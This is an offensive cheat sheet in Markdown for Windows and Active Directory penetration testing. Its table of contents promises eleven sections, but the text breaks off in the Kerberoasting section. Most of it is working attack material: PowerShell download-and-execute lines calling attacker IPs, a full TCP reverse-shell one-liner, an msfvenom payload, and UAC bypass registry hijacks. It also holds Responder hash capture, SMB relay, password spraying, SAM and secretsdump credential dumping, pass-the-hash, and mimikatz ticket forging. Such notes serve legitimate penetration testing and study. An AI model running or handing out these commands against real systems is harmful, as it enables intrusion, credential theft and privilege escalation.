# Table of Content
1. [Alternate Data Stream](#Alternate-Data-Stream)
2. [Powershell](#Powershell)
3. [Reverse Shells](#Reverse-Shells)
4. [Privilege Escalation](#Privilege-Escalation)
5. [Active Directory](#Active-Directory)
6. [Client Side Attacks](#Client-Side-Attacks)
7. [Process Injection and Migration](#Process-Injection-and-Migration)
8. [Process Hollowing](#Process-Hollowing)
9. [Port Redirection and Tunneling](#Port-Redirection-and-Tunneling)
10. [AV Evasion](#AV-Evasion)
11. [Application Whitelisting](#Application-Whitelisting)
----


# Alternate Data Stream
Alternate Data Streams (ADS) is a file attribute specific to Windows NTFS (New Technology File System). Every file has at least one data stream ($DATA) and ADS allows files to contain more than one stream of data. Natively Window Explorer doesn't display ADS to the user. There are 3rd party executables that can be used to view this data, but Powershell gives you the ability to view ADS for files.

```
Get-Item -Path file.exe -Stream *

wmic process call create $(Resolve-Path file.exe:streamname)
```
# Powershell
## User Management
* add user
```
net user <username> <password> /add /domain
```
* add user to group
```
net group <group> <username> /add
```
## Transfer Files
```
IEX(New-Object System.Net.WebClient).DownloadFile("http://10.10.14.13:8000/file", "C:\Users\user\Desktop\file")
Copy-Item \\10.10.14.13\share\file C:\Users\user\Desktop\file
```
## Reverse shell with local authentication
* assuming you already found credentials (for example by running powerup)
```powershell
$pass = ConvertTo-SecureString 'Password!' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('Administrator', $pass)
Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient).downloadString('http://10.10.14.13:8000/rev.ps1')" -Credential $cred
```

## Misc Commands

<details>
  <summary>Expand</summary>

**Get-ChildItem**
* ```-Path``` Specifies a path to one or more locations. Wildcards are accepted.
* ```-File``` / -Directory To get a list of files, use the File parameter. To get a list of directories, use the Directory parameter. You can use the Recurse parameter with File and/or Directory parameters.
* ```-Filter``` Specifies a filter to qualify the Path parameter.
* ```-Recurse``` Gets the items in the specified locations and in all child items of the locations.
* ```-Hidden``` To get only hidden items, use the Hidden parameter.
* ```-ErrorAction``` SilentlyContinue Specifies what action to take if the command encounters an error.
```
Get-ChildItem -Hidden
Get-ChildItem -File -Hidden -ErrorAction SilentlyContinue
```

**Get-Content**
```
Get-Content -Path file.txt
Get-Content file.txt | Select -first 10
Get-Content file.txt | Select-String 'searchstring'
Get-Content -Path file.txt | Measure-Object -Word
(Get-Content -Path file.txt)[index]
```

**Select-String**
```
Select-String -Path 'c:\users\administrator\desktop' -Pattern '*.pdf'
Select-String -Path file.txt -Pattern 'searchstring'
```

**Get-FileHash**
```
Get-FileHash -Algorithm MD5 file.txt
```

**Encode Base64**
```
$FileName = "C:\Users\Phineas\Desktop\Oracle issue.txt"
$data = Get-Content $Filename
$data_utf8 = [System.Text.Encoding]::UTF8.GetBytes($data)
[System.Convert]::ToBase64String($data_utf8)
```
</details>

## Show Proxy Settings
```
[System.Net.WebRequest]::DefaultWebProxy.GetProxy("https://google.com")
[System.Net.WebRequest]::DefaultWebProxy.GetProxy("http://10.10.10.10/run.ps1")
```

You can also find it in the registry (name: ProxySever)
```
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\InternetSettings
```

```
$keys = Get-ChildItem 'HKU:\'
ForEach ($key in $keys) {if ($key.Name -like "*S-1-5-21-*") {$start = $key.Name.substring(10);break}}
$proxyAddr=(Get-ItemProperty -Path "HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\").ProxyServer
```

## Set Proxy
```
$wc = new-object system.net.webclient
$wc.proxy = $null
$wc.DownloadSTring("http://10.10.10.10/run.ps1")
```
Get a users proxy settings and set it likewise
```
New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null
$keys = Get-ChildItem 'HKU:\'
ForEach ($key in $keys) {if ($key.Name -like "*S-1-5-21-*") {$start = $key.Name.substring(10);break}}
$proxyAddr=(Get-ItemProperty -Path "HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\").ProxyServer
[system.net.webrequest]::DefaultWebProxy = new-object System.Net.WebProxy("http://$proxyAddr")
$wc = new-object system.net.WebClient
$wc.DownloadString("http://10.10.10.10/run.ps1")
```

## Set User-Agent
```
$wc = new-object system.net.webclient
$wc.Headers.Add('User-Agent', 'MyUserAgent')
$wc.DownloadString("http://10.10.10.10/run.ps1")
```

# Reverse Shells
Download and execute with Powershell:
```
powershell -c "IEX((New-Object System.Net.WebClient).DownloadString('http://192.168.1.109/1.bat'))"

c:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.22:8000/Invoke-PowerShellTcp.ps1')
```

Powershell only:
```
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```




# Privilege Escalation
## bloodyAD
* https://github.com/CravateRouge/bloodyAD
bloodyAD is an Active Directory privilege escalation swiss army knife

## Switch to high integrity level
```
powershell.exe Start-Process cmd.exe -Verb runAs
```

**Checklist:**
* [Checklist](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation)

**Process Monitoring:**
* [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)

## System Enumeration
```
systeminfo
hostname
tasklist
wmic qfe
wmic qfe get Caption, Description, HotFixID, InstalledOn
wmic logicaldisk get caption,description,providername
mountvol
Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"} #get kernel modules and device drivers
driverquery /v # get drivers installed on system

# list services
wmic service get name,displayname,pathname,startmode
# look for services that were automatically started and not path c:\windows
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

# get permissions on directory
icalcs "C:\Path"
```
Discover domain controller hostname
```
nslookup
set type=all
_ldap._tcp.dc._msdcs.sandbox.local
exit
```


## User Enumeration
```
whoami
whoami /priv
whoami /groups
net user 
net user /domain
net user Administrator
net user jim /domain
net group /domain
net localgroup
net localgroup Administrators
```

## Restart host
```
shutdown /r /t 0
```

## Start/Stop Service
First list with
```
wmic service get name,displayname,pathname,startmode
```
Then start/stop
```
net start ServiceName
net stop ServiceName
```

## Scheduled Tasks
```
schtasks /query /fo LIST /v
```

## Applications
Only shows application installed by windows installer
```
wmic product get name,version,vendor
```

## Network Enumeration
```
ipconfig
ipconfig /all
arp -a
route print
netstat -ano
```

## Password Hunting
```
findstr /si password *.txt *.ini *.config
```

## AV and FW Enumeration
```
sc query windefend
sc queryex type= service # Show all services
netsh advfirewall firewall dump
netsh advfirewall show currentprofile
netsh advfirewall firewall show rule name=all
firewall show state
netsh firewall show config
```

## Update Windows Firewall
**SYSTEM privilege required**

Update Windows Firewall since incoming requests are most likely blocked
```
netsh advfirewall firewall add rule name="foward_port_rule" protocol=TCP dir=in localip=10.10.10.10 localport=4444 action=allow
```
Port Forward
```
netsh interface portproxy add v4tov4 listenport=4444 listenaddress=10.10.10.10 connectport=445 connectaddress=192.168.1.10
```
Example: List SMB shares (from attacker machine, victim=10.10.10.10, hostToConnect=192.168.1.10)
```
smbclient -L 10.10.10.10 --port=4444
# mount share
sudo mount -t cifs -o port=4444 //10.10.10.10/Share -o username=Administrator,password=passwd! /mnt/share
```



## AutoElevate Binaries (SUID like)
First, on Windows systems, we should check the status of the AlwaysInstallElevated48 registry setting. If this key is enabled (set to 1) in either HKEY_CURRENT_USER or HKEY_LOCAL_MACHINE, any user can run Windows Installer packages with elevated privileges.

```
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
```

## UAC Bypass
Check integrity level with ``whoami /groups`` or ``whoami /all``

Using Powershell (GUI access needed for prompt)
```
powershell.exe Start-Process cmd.exe -Verb runAs
```

The following example uses C:\windows\system32\fodhelper.exe which is launched every time a user opens 'Manage optional features'
1. Use [Sysinternals](https://docs.microsoft.com/en-us/sysinternals/) and sigcheck.exe to verify integrity level
```
sigcheck.exe -a -m C:\Windows\System32\fodhelper.exe /accepteula
```
2. Look for 'requestedExecutionLevel'(requireAdministrator) and 'autoElevate'(true)
3. Launch [Procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)
4. Filter by process name
5. Filter by Operation contains Reg
6. Filter for Result = "NAME NOT FOUND" to get registry hives that are accessed but not exist
7. Look for a registry hive that you have read and write access, e.g. HKEY_CURRENT_USER => Path contains HKCU
8. Find out what the application attempts to query
9. Look for other access to entries that contain same query (or part of it), if the process can successfully acces that key in some other hive, the results will provide us with more clues
10. Create according registry, e.g. ``REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command``
11. Find out what value fodhelper.exe attempts to query (DelegateExecute)
12. Add a DelegateExecute entry, leaving its value empty. If the application discovers this empty value it will hopefully follow the MSDN specification for application protocols and look for a program to launch
```
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
```
13. Replace "NAME NOT FOUND" filter with "SUCCESS"
14. Verify fodhelper.exe finds the new DelegateExecute entry
15. Replace the empty value with an executable (cmd.exe)
```
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
```
Powershell:
```powershell
New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value powershell.exe -Force

New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force

C:\Windows\System32\fodhelper.exe
```


**Example Eventvwr.exe**
* see https://lolbas-project.github.io/lolbas/Binaries/Eventvwr/

Create reverse shell .exe file
```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.134 LPORT=444 -f exe -o foobar.exe
```
Modify Registry
```
REG ADD HKCU\Software\Classes\mscfile\shell\open\command /d "C:\Users\Public\Videos\foobar.exe" /f
```
Set up listener and run eventvwr.exe



## Automated Enumeration Tools
Download and run executable with simple bypass method (from cmd.exe)
```
echo IEX(New-Object System.Net.WebClient).DownloadString("http://10.10.14.23:8000/jaws-enum.ps1") | powershell -noprofile -
```
Download File
```
IEX(New-Object System.Net.WebClient).DownloadFile("http://10.10.14.23:8000/nc.exe", "C:\test\nc.exe")
```

**Executables:**
* [windows-privesc-check](https://github.com/pentestmonkey/windows-privesc-check)
* [winPEAS.exe](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
* [Seatbelt.exe](https://github.com/GhostPack/Seatbelt)
* [Wason.exe](https://github.com/rasta-mouse/Watson)
* [SharpUp.exe](https://github.com/GhostPack/SharpUp)

**PowerShell Scripts:**
* [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) 
* [Sherlock.ps1](https://github.com/rasta-mouse/Sherlock)
```
powershell -ep bypass
Import-Module .\Sherlock.ps1
Find-AllVulns
```
* [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
* [jaws-enum.ps1](https://github.com/411Hall/JAWS)

**Other Resources:**
* [exploit suggester (metasploit)](https://blog.rapid7.com/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/)
* [windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)
* [windows-exploit-suggester.py (local)](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
this script uses python2 which can lead to issues. create virtualenv and make sure you are using xlrd version 1.2.0
```
virtualenv -p /usr/bin/python2.7 venv
source venv/bin/activate
pip install xlrd==1.2.0
./windows-exploit-suggester.py --update
./windows-exploit-suggester.py --database 2020-12-12-mssb.xls --systeminfo sysinfo.txt
```
* [Kernel Exploits](https://github.com/SecWiki/windows-kernel-exploits)

## Potato Attacks
Check if SeImpersonatePrivilege authentication is enabled with ``whoami /priv``
* [Rotten Potato](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)
* [Juicy Potato](https://github.com/ohpe/juicy-potato)
```
C:\Users\Public\JuicyPotato.exe -t t -p C:\Users\Public\exe.exe -l 5837
```

## SeDebugPrivilege Privesc
* get meterpreter session and show processes with ``ps``
* look for winlogon.exe and ``migrate <PID>`` 

## Active Directory Certificate Service
Active Directory Certificate Services (AD CS) is a Windows Server role for issuing and managing public key infrastructure (PKI) certificates used in secure communication and authentication protocols

See https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/active-directory-certificate-services-overview

https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/

https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates
https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation



Find vulnerable certificate templates with [Certify](https://github.com/GhostPack/Certify) or [Certipy](https://github.com/ly4k/Certipy)

On Windows Host
```
C:\Temp> Certify.exe find /vulnerable
```

On attacker machine
```
$ certipy find -u john@corp.local -p Passw0rd -dc-ip 172.16.126.128
```

## Service Accounts
Service Accounts often have higher privileges than regular user accounts.
On Windows, some services executed as LOCAL SERVICE or NETWORK SERVICE are configured to run with a restricted set of privileges. Therefore, even if the service is compromised, you won't get the golden impersonation privileges and privilege escalation to LOCAL SYSTEM should be more complicated. However, I found that, when you create a scheduled task, the new process created by the Task Scheduler Service has all the default privileges of the associated user account (except SeImpersonate). Therefore, with some token manipulations, you can spawn a new process with all the missing privileges.
 
 
See also https://itm4n.github.io/localservice-privileges/

To restore the privileges of the service account you can either create and run a scheduled task or use [FullPowers.exe](https://github.com/itm4n/FullPowers/tree/master)
 
Privileges before:
```
PS C:\xampp\htdocs\uploads> whoami
nt authority\local service
PS C:\xampp\htdocs\uploads> whoami /priv
 
PRIVILEGES INFORMATION
----------------------
 
Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeCreateGlobalPrivilege       Create global objects          Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
 
```
 
Create and run scheduled task:
```
$TaskAction = New-ScheduledTaskAction -Execute 'powershell.exe' '-File "C:\xampp\htdocs\uploads\revshell.ps1"'
Register-ScheduledTask -Action $TaskAction -TaskName "SomeTask11"
Start-ScheduledTask -TaskName "SomeTask11"
```
 
Privileges after:
```
PS C:\Windows\system32> whoami
nt authority\local service
PS C:\Windows\system32> whoami /priv
 
PRIVILEGES INFORMATION
----------------------
 
Privilege Name                Description                         State   
============================= =================================== ========
SeAssignPrimaryTokenPrivilege Replace a process level token       Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process  Disabled
SeTcbPrivilege                Act as part of the operating system Disabled
SeSystemtimePrivilege         Change the system time              Disabled
SeAuditPrivilege              Generate security audits            Disabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled 
SeCreateGlobalPrivilege       Create global objects               Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set      Disabled
SeTimeZonePrivilege           Change the time zone                Disabled
```

# Active Directory

## Cable - Post-exploitation enumeration tool
https://github.com/logangoins/Cable

## Capturing NTLM Net-Hashes with Responder

:information_source: Default configuration in windows is always fall back to LLMNR if DNS resolving fails. LLMNR broadcasts its request to the whole network.

```sequence
Victim->DNS Server: Who is "fileservrr"
DNS Server->Victim: I don't know
Victim->Network: Anyone knows who "fileservrr" is?
Attacker->Victim: Yes, this is me
Victim->Attacker: I would like to log in
Attacker->Victim: OK, encrypt this challenge with your password hash
Victim->Attacker: Sends encrypted challenge
Attacker->Victim: Sorry, something went wrong
```

``` bash
responder -I eth0 -rdwv

[+] Listening for events...
[SMB] NTLMv2-SSP Client   : 192.168.92.129
[SMB] NTLMv2-SSP Username : WHITEROSE\ealderson
[SMB] NTLMv2-SSP Hash     : ealderson::WHITEROSE:af77856ba3332f51:B81BF48A67FE909F054D588DF1345C6A:0101000000000000C0653150DE09D2012BC03559A3DFA755000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000100000000200000F279BA7D9D36AB76937A31505A3A023E63ECAF17A4F311B0E248705A3CB09B9A0A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00390032002E003100330033000000000000000000
```

## Crack NTLMv2 Net-Hashes with hashcat

1. Get module number of NTLM hash with 

   ``` bash
   hashcat --example-hashes | grep NTLM -C 4
   ```

2. Crack Hash

   ``` bash
   hashcat -m 5600 hashes.txt rockyou.txt 
   ```

## SMB Relay Attack

:warning: This does not work if SMB Signing is required. 

:warning: The relayed user needs to be a local administrator on target machine to dump the SAM hashes.

Disable SMB in ```/etc/responder/Responder.conf``` and run:

``` bash
responder -I eth0 -rdwv
```

Open a second terminal and run:

```
ntlmrelayx.py -tf targets.txt -smb2support
```

## LDAP Enumeration
```bash
# get base domain name with nmap
nmap -n -sV --script "ldap* and not brute" 10.10.10.161
nmap -p 389 --script ldap-rootdse -Pn 10.10.10.161
nmap -p 389 --script ldap-search -Pn 10.10.10.161

# get information
ldapsearch -x -h 10.10.10.161 -D '' -w '' -b "DC=htb,DC=local"  
```

## Password Spraying
* get the domain password policy first to check lockout policy
```bash
crackmapexec smb 10.10.10.161 --pass-pol
crackmapexec smb 10.10.10.161 -u userlist.txt -p pwlist.txt
crackmapexec smb 10.10.10.0/24 -u userlist.txt -p pwlist.txt
crackmapexec smb 10.10.10.0/24 -u userlist.txt -p pwlist.txt --continue-on-success
crackmapexec mssql 10.10.10.10 -u user.txt -p password.txt
```
* cracking considering lockout policy, see [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1)

## Shell Access with Credentials

:information_source: Start with smbexec.py and wmiexec.py due to psexec.py is more noisy and may trigger windows defender.
:information_source: If winrm port is open, see [evil-winrm](https://github.com/Hackplayers/evil-winrm)

``` bash
psexec.py whiterose.local/ealderson:Password!@192.168.92.129
impacket-psexec whiterose.local/ealderson:Password!@192.168.92.129
```

* https://github.com/Hackplayers/evil-winrm

* PowerShell
```
$dcsess = New-PSSession -Computer DCHOSTNAME
Invoke-Command -Session $dcsess -ScripBlock {ipconfig}
Copy-Item "C:\Users\Public\whoami.exe" -Destination "C:\Users\Public\" -ToSession $dcsesh
```

## Shell Access with Kerberos Ticket
Create a TGT Kerberos ticket first by issuing a command that requires domain permissions (net use \\dc01)
```
.\PsExec.exe \\dc01 cmd.exe
```

## IPv6 Attacks

:information_source: ​Only possible if IPv6 is enabled and no DNS Server is defined for IPv6. In this case we may get NTLM net-Hashes and can relay those to authenticate (see SMB Relay Attack). Details: 

[Combining NTLM Relaying and Kerberos Delegation](https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/)

[mitm6 - compromising IPv4 networks via IPv6](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/)

:information_source: Make sure mitm6 is installed. If not, install it with: ``` sudo pip3 install mitm6 ```

``` bash
mitm6 -d whiterose.local
```

Open a second terminal and run:

```
ntlmrelayx.py -6 -t ldaps://192.168.92.130 -wh fakewpad.whiterose.local -l outfile
```

:information_source: ``` --delegate-access ``` 


## Collect all Users with their Attributes

<details>
  <summary>Expand</summary>

For more information about samAccountTypes see this [link](https://docs.microsoft.com/en-us/windows/win32/adschema/a-samaccounttype?redirectedfrom=MSDN)
```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

$PDC = ($domainObj.PdcRoleOwner).Name

$SearchString = "LDAP://"

$SearchString += $PDC + "/"

$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

$SearchString += $DistinguishedName

$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)

$objDomain = New-Object System.DirectoryServices.DirectoryEntry

$Searcher.SearchRoot = $objDomain

$Searcher.filter="samAccountType=805306368"

$Result = $Searcher.FindAll()

Foreach($obj in $Result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }
    
    Write-Host "------------------------"
} 

```
</details>

## Resolving Nested Groups


<details>
  <summary>Expand</summary>

Print names of all the groups
```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

$PDC = ($domainObj.PdcRoleOwner).Name

$SearchString = "LDAP://"

$SearchString += $PDC + "/"

$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

$SearchString += $DistinguishedName

$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)

$objDomain = New-Object System.DirectoryServices.DirectoryEntry

$Searcher.SearchRoot = $objDomain

$Searcher.filter="(objectClass=Group)"

$Result = $Searcher.FindAll()

Foreach($obj in $Result)
{
    $obj.Properties.name
}

```
Assuming we found group XY. Replace the last 8 lines with:
```
$Searcher.filter="(name=XY)"

$Result = $Searcher.FindAll()

Foreach($obj in $Result)
{
    $obj.Properties.member
}
```
For finding domain joined services
```
.
..
$Searcher.filter="serviceprincipalname=*http*"
..
.
```
</details>

## PowerView

:information_source: [sourcecode](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)

:information_source: [cheatsheet](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)

1. Bypass execution policy

```
powershell -ep bypass
```

2. Use PowerView

```
. .\PowerView.ps1
Import-Module .\PowerView.ps1
```

3. Start enumerating. Examples:

```
Get-NetDomain
Get-NetDomainControllers
Get-DomainPolicy
{Get-DomainPolicy}."system access"
Get-NetUser
Get-NetUser | select cn
Get-NetUser | select samaccountname
Get-UserProperty
Get-UserProperty -Properties pwdlastset
Get-NetComputer -FullData
Get-NetGroup
Get-NetGroupMember -GroupName "Domain Admin"
Invoke-ShareFinder
Get-NetGPO | select displayname, whenchanged
```

:information_source: Detect possible honey accounts with:

```
Get-UserProperty -Properties logoncount
```

Currently logged on Users
```
Get-NetLoggedon -ComputerName clientXY
Get-NetSession -ComputerName DC01
```

Get the domain's account policy. Specially helpful for bruteforce attacks => see lockout policy
```
net accounts
```
or using crackmapexec
```
crackmapexec <IP> -u 'user' -p 'password' --pass-pol
```

## Bloodhound

:information_source: [SharpHound.ps1](https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.ps1) 				

:information_source: [Data-Collector](https://github.com/BloodHoundAD/BloodHound/wiki/Data-Collector) 

On host run:

```
powershell -ep bypass
. .\SharpHound.ps1
Invoke-Bloodhound -CollectionMethod All -Domain WHITEROSE.local -ZipFileName file.zip 
```

You can also use the .exe
```
.\SharpHound.exe -c all
```

Transfer the zip file to kali instance and load it into bloodhound to visualize.

:information_source: Install bloodhound using apt or download git repository
:information_source: bloodhound depends on neo4j so make sure it is installed
:information_source: good starting point are prebuild queries. see 'shortest path to high value targets'

Start NEO4j (user: neo4j)
```
sudo neo4j console
```
Start Bloodhound
```
bloodhound
```
Then import zip file

## Pass The Password

:information_source: install crackmapexec using apt
:information_source: keep lockout policy in mind

You can spray credentials in an AD network using crackmapexec:

```
crackmapexec smb 192.168.92.0/24 -u ealderson -d WHITEROSE.local -p Password123
```

## Dumping Hashes with secretsdump.py

:information_source: secretsdump.py is part of the impacket toolkit

```
secretsdump.py whiterose/ealderson:Password123@192.168.92.131
```

## Dumping SAM file 
```
reg save HKLM\SAM SAM
reg save HKLM\SYSTEM system
impacket-secretsdump -sam sam -system system LOCAL
```

## Pass The Hash
If you retreive the NTLM hash simply paste it as lmhash and nthash:
ntlm: 8c802621d2e36fc074345dded890f3e5 => 8c802621d2e36fc074345dded890f3e5:8c802621d2e36fc074345dded890f3e5

Use NTHASH (LMHASH:NTHASH)

```
crackmapexec 192.168.92.0/24 -u "Elliot Alderson" -H 64f12cdda88057e06a81b54e73b949b --local
```

Alternative: [pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit)
```
pth-winexe -U user%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.10.10.22 cmd
```
Or 
```
psexec.py domain.local/Administrator@192.168.10.10 -hashes 8c802621d2e36fc074345dded890f3e5:8c802621d2e36fc074345dded890f3e5
```
```
psexec.py -u "Elliot Alderson":@192.168.92.131 -hashes <lmhash:nthash>
psexec.py domain.local/Administrator@192.168.10.10 -hashes 8c802621d2e36fc074345dded890f3e5:8c802621d2e36fc074345dded890f3e5
```
Or
```
# Overpass the hash
mimikatz # sekurlsa::pth /user:user /domain:domain.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe
PS C:\> net use \\dc01
PS C:\> .\psexec.exe \\dc01 cmd.exe
```

## Pass The Ticket (Silver Ticket)
The Pass the Ticket attack takes advantage of the TGS, which may be exported and re-injected elsewhere on the network and then used to authenticate to a specific service. In addition, if the service tickets belong to the current user, then no administrative privileges are required. (TGS offers more flexibility than TGT)

Example SID:
```
  S-1-5-21-2536614405-3629634762-1218571035-1116
  \_______________________________________/\___/
  S-<Revision Level>-<Identifier-Authority>-<Relative Identifier>
```
Use mimikatz to create a silver ticket.
To create a silver ticket, we use the password hash and not the cleartext password. If a kerberoast session presented us with the cleartext password, we must hash it before using it to generate a silver ticket.
```
mimikatz # kerberos::purge
mimikatz # kerberos::list
mimikatz # kerberos::golden /user:user /domain:domain.com /sid:s-1-5-21-1602875587-2787523311-2599479668 /target:ServicePrincipalName /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
```
where /rc4 is the hash

## Lateral Movement with Distributed Component Object Model (DCOM) 
Also see impacket-dcomexec

<details>
  <summary>Expand</summary>

i: Requires access to TCP 135 for DCOM and TCP 445 for SMB. Relatively new vector. May avoid some detection system like EDR/NDR/AV.

The Microsoft Component Object Model (COM) is a system for creating software components that interact with each other. While COM was created for either same-process or cross-process interaction, it was extended to Distributed Component Object Model (DCOM) for interaction between multiple computers over a network.

Discover available methods from a DCOM object. In this example Excel.
```
$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "192.168.1.110"))

$com | Get-Member
```
This script revealed the 'Run' method which allows to execute Visual Basic for Applications (VBA) remotely
POC macro:
```
Sub mymacro()
    Shell ("notepad.exe")
End Sub
```
Save to an Excel file and copy to target
```
$LocalPath = "C:\Users\jeff_admin.corp\myexcel.xls"

$RemotePath = "\\192.168.1.110\c$\myexcel.xls"

[System.IO.File]::Copy($LocalPath, $RemotePath, $True)
```
The Excel application is instantiated through DCOM with SYSTEM account. This account does not have a profile, which is used as part of the opening process.
To fix this, simply create the Desktop folder at ``C:\Windows\SysWOW64\config\systemprofile``
```
$Path = "\\10.10.10.10\c$\Windows\sysWOW64\config\systemprofile\Desktop"

$temp = [system.io.directory]::createDirectory($Path)
```
Call the 'Run' method on our Excel file
```
$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "10.10.10.10"))

$LocalPath = "C:\Users\dummy_admin.corp\myexcel.xls"

$RemotePath = "\\10.10.10.10\c$\myexcel.xls"

[System.IO.File]::Copy($LocalPath, $RemotePath, $True)

$Path = "\\10.10.10.10\c$\Windows\sysWOW64\config\systemprofile\Desktop"

$temp = [system.io.directory]::createDirectory($Path)

$Workbook = $com.Workbooks.Open("C:\myexcel.xls")

$com.Run("mymacro")
```
</details>


## Token Impersonation

Get a meterpreter session (e.g. smb/psexec).

```
meterpreter> load incognito
meterpreter> list tokens
meterpreter> impersonate_token marvel\\administrator
```

## Kerberoasting
Enumerate SPN's and request a service ticket. Decrypting ticket by brute forcing provides the password hash which can be cracked to retreive the password in clear text.

:information_source: GetUserSPNs.py is part of the impacket toolkit

**Kerberos in a nutshell:**
```sequence
User->Domain Controller: 1. Request TGT, Provide NTLM hash
Domain Controller->User: 2. Receive TGT enc. w. krbtgt hash
User->Domain Controller: 3. Request TGS for Server (Presents TGT)
Domain Controller->User: 4. Receive TGS enc. w. servers account hash
User->Application Server: 5. Presents TGS for service enc. w. servers account
Application Server->Domain Controller: (opt.) PAC Validation request
Domain Controller->Application Server: (opt.) PAC Validation response
```

Rubeus Tool for Kerberos interaction: https://github.com/GhostPack/Rubeus

<details>
  <summary>Expand</summary>

**Get Kerberos Service Ticket by SPN:**
When requesting the service ticket from the domain controller, no checks are performed on whether the user has any permissions to access the service hosted by the service principal name. These checks are performed as a second step only when connecting to the service itself. This means that if we know the SPN we want to target, we can request a service ticket for it from the domain controller. Then, since it is our own ticket, we can extract it from local memory and save it to disk.


Powershell script:
```
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorpWebServer.corp.com'
```
List tickets with powershell:
```
klist
```
Or with mimikatz:
```
kerberos::list
kerberos::list /export
```

Or simply with Invoke-Kerberoast.ps1
```
Import Module .\Invoke-Kerberoast.ps1
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hash.hash
```

**Import Kerberos Tickets**

(..so you can view them with klist)

mimikatz.exe "privilege::debug" "kerberos:ptt c:\temp\tickets" "exit"



**Cracking Service Ticket:**
Since the service ticket is encrypted with the service accounts password hash, we can bruteforce this with a wordlist
This is also possible with john the ripper or hashcat (which is a lot faster)
```
sudo apt update && sudo apt install kerberoast
python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt ticket.kirbi 
```

If ticket is obtained with mimikatz ``kerberos::list /export``
```
kirbi2john ticket.kirbi > ticket.txt
john --wordlist=rockyou.txt ticket.txt

```

